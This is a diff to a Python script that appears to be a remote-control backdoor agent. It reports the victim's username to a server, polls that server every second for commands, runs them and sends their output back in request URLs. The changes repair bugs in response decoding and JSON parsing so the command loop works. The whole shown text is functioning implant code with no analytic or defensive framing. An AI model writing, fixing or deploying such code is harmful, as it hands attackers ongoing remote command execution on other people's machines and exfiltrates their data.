@@ -22,13 +22,13 @@ agent = run_cmd("whoami")
 requests.get(baseurl+"/new?agent="+agent)
 def reply_cmd(cmd,id):
         res = run_cmd(cmd)
-        requests.get(baseurl+"/res?id=%s&result=%s" % (id,res))
+        requests.get((baseurl+"/res?id=%s&result=%s" % (id,res)))
 while True:
         try:
                 time.sleep(1)
                 cmd = requests.get(baseurl + "/cmd?agent="+agent)
-                if not cmd.content == "none":
-                        data = cmd.json
+                if not cmd.content.decode() == "none":
+                        data = cmd.json()
                         cmd = data['cmd']
                         id = data['id']
                         _thread.start_new_thread(reply_cmd, (cmd, id, ))
